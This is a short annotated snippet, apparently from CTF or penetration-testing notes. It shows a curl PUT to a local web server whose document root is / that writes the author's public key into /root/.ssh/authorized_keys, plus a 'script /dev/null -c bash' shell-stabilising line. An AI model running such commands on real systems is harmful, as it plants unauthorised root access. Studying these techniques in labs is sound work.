curl -X PUT localhost:1337/root/.ssh/authorized_keys -d "$(cat root.pub)"
# PUT request that will write the file. Having set the document root to /, we specify the full path /root/.ssh/authorized_keys and use the -d flag to set the contents of the written file to our public key.

script /dev/null -c bash
# Stable Shell
